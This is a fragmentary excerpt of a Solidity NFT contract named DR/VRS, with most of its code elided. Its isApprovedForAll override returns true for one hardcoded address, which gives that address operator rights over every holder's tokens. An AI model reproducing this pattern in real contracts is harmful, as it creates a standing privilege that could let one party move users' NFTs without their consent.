  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x4F3bc6b59309B862ff6b10146A14475fD942c0a9){return true;}
...
contract DRVRS is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("DR/VRS", "DRVRS", maxBatchSize_, collectionSize_) {
